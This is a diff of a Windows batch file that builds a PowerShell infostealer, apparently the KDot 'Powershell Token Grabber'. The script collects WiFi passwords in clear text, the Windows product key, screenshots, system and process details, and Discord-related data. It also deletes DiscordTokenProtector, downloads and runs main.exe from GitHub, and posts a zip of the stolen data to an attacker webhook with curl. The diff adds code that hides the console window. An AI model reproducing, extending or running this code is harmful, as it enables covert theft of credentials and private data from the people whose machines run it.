@@ -37,24 +37,16 @@ echo $mac ^> $env:LOCALAPPDATA\Temp\mac.txt >> powershell123.ps1
 echo $username = $env:USERNAME >> powershell123.ps1
 echo $hostname = $env:COMPUTERNAME >> powershell123.ps1
 echo $netstat = netstat -ano ^> $env:LOCALAPPDATA\Temp\netstat.txt >> powershell123.ps1
-echo # Extraction of WiFi Passwords >> powershell123.ps1
 echo $wifipasslist = netsh wlan show profiles ^| Select-String "\:(.+)$" ^| %%{$name=$_.Matches.Groups[1].Value.Trim(); $_} ^| %%{(netsh wlan show profile name="$name" key=clear)}  ^| Select-String "Key Content\W+\:(.+)$" ^| %%{$pass=$_.Matches.Groups[1].Value.Trim(); $_} ^| %%{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} ^| out-string >> powershell123.ps1
 echo $wifi = $wifipasslist ^| out-string >> powershell123.ps1
 echo $wifi ^> $env:temp\WIFIPasswords.txt >> powershell123.ps1
-echo # Startup Apps >> powershell123.ps1
 echo Get-CimInstance Win32_StartupCommand ^| Select-Object Name, command, Location, User ^| Format-List ^> $env:temp\StartUpApps.txt >> powershell123.ps1
-echo # Running Services >> powershell123.ps1
 echo Get-WmiObject win32_service ^|? State -match "running" ^| select Name, DisplayName, PathName, User ^| sort Name ^| ft -wrap -autosize ^>  $env:LOCALAPPDATA\Temp\running-services.txt >> powershell123.ps1
-echo # Running Applications >> powershell123.ps1
 echo Get-WmiObject win32_process ^| Select-Object Name,Description,ProcessId,ThreadCount,Handles,Path ^| ft -wrap -autosize ^> $env:temp\running-applications.txt >> powershell123.ps1
-echo # Installed Applicatons >> powershell123.ps1
 echo Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* ^| Select-Object DisplayName, DisplayVersion, Publisher, InstallDate ^| Format-Table ^> $env:temp\Installed-Applications.txt >> powershell123.ps1
-echo # Network Adapters >> powershell123.ps1
 echo Get-NetAdapter ^| ft Name,InterfaceDescription,PhysicalMediaType,NdisPhysicalMedium -AutoSize ^> $env:temp\NetworkAdapters.txt >> powershell123.ps1
-echo # Get Windows Product Key >> powershell123.ps1
 echo $ProductKey >> powershell123.ps1
 echo Get-ProductKey ^> $env:localappdata\temp\ProductKey.txt >> powershell123.ps1
-echo # Screenshot >> powershell123.ps1
 echo Add-Type -AssemblyName System.Windows.Forms,System.Drawing >> powershell123.ps1
 echo $screens = [Windows.Forms.Screen]::AllScreens >> powershell123.ps1
 echo $top    = ($screens.Bounds.Top    ^| Measure-Object -Minimum).Minimum >> powershell123.ps1
@@ -116,10 +108,6 @@ echo } >> powershell123.ps1
 echo $payload = $embed_and_body ^| ConvertTo-Json -Depth 10 >> powershell123.ps1
 echo Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing ^| Out-Null >> powershell123.ps1
 echo Set-Location $env:LOCALAPPDATA\Temp >> powershell123.ps1
-echo taskkill.exe /f /im "Discord.exe" ^| Out-Null >> powershell123.ps1
-echo taskkill.exe /f /im "DiscordCanary.exe" ^| Out-Null >> powershell123.ps1
-echo taskkill.exe /f /im "DiscordPTB.exe" ^| Out-Null >> powershell123.ps1
-echo taskkill.exe /f /im "DiscordTokenProtector.exe" ^| Out-Null >> powershell123.ps1
 echo $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" >> powershell123.ps1
 echo if ($token_prot -eq $true) { >> powershell123.ps1
 echo Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force >> powershell123.ps1
@@ -132,7 +120,6 @@ echo $TEMP_KOT = Test-Path "$env:LOCALAPPDATA\Temp\KDOT" >> powershell123.ps1
 echo if ($TEMP_KOT -eq $false) { >> powershell123.ps1
 echo New-Item "$env:LOCALAPPDATA\Temp\KDOT" -Type Directory >> powershell123.ps1
 echo } >> powershell123.ps1
-echo # Faster Download Speed >> powershell123.ps1
 echo $ProgressPreference = "SilentlyContinue";Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/Fixed_version/main.exe" -OutFile "main.exe" -UseBasicParsing >> powershell123.ps1
 echo $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru >> powershell123.ps1
 echo $proc.WaitForExit() >> powershell123.ps1
@@ -158,8 +145,6 @@ echo Move-Item -Path "$extracted\StartUpApps.txt" -Destination "$extracted\KDOT\
 echo Move-Item -Path "$extracted\running-services.txt" -Destination "$extracted\KDOT\running-services.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
 echo Move-Item -Path "$extracted\running-applications.txt" -Destination "$extracted\KDOT\running-applications.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
 echo Compress-Archive -Path "$extracted\KDOT" -DestinationPath "$extracted\KDOT.zip" -Force >> powershell123.ps1
-echo #Invoke-WebRequest -Uri "$webhook" -Method Post -InFile "$extracted\KDOT.zip" -ContentType "multipart/form-data" >> powershell123.ps1
-echo #curl.exe -X POST -H "Content-Type: multipart/form-data" -F "file=@$extracted\KDOT.zip" $webhook >> powershell123.ps1
 echo curl.exe -X POST -F 'payload_json={\"username\": \"POWERSHELL GRABBER\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/m2SSKrBt/Logo.gif\"}' -F "file=@$extracted\KDOT.zip" $webhook >> powershell123.ps1
 echo Remove-Item "$extracted\KDOT.zip" >> powershell123.ps1
 echo Remove-Item "$extracted\KDOT" -Recurse >> powershell123.ps1
@@ -221,9 +206,22 @@ echo } >> powershell123.ps1
 echo catch {} >> powershell123.ps1
 echo } >> powershell123.ps1
 echo } >> powershell123.ps1
+echo function Hide-Console >> powershell123.ps1
+echo { >> powershell123.ps1
+echo if (-not ("Console.Window" -as [type])) { >> powershell123.ps1
+echo Add-Type -Name Window -Namespace Console -MemberDefinition ' >> powershell123.ps1
+echo [DllImport("Kernel32.dll")] >> powershell123.ps1
+echo public static extern IntPtr GetConsoleWindow(); >> powershell123.ps1
+echo [DllImport("user32.dll")] >> powershell123.ps1
+echo public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow); >> powershell123.ps1
+echo ' >> powershell123.ps1
+echo } >> powershell123.ps1
+echo $consolePtr = [Console.Window]::GetConsoleWindow() >> powershell123.ps1
+echo $null = [Console.Window]::ShowWindow($consolePtr, 0) >> powershell123.ps1
+echo } >> powershell123.ps1
 echo if (CHECK_IF_ADMIN -eq $true) { >> powershell123.ps1
+echo Hide-Console >> powershell123.ps1
 echo TASKS >> powershell123.ps1
-echo #pause >> powershell123.ps1
 echo } else { >> powershell123.ps1
 echo Write-Host ("Please run as admin!") -ForegroundColor Red >> powershell123.ps1
 echo Request-Admin >> powershell123.ps1
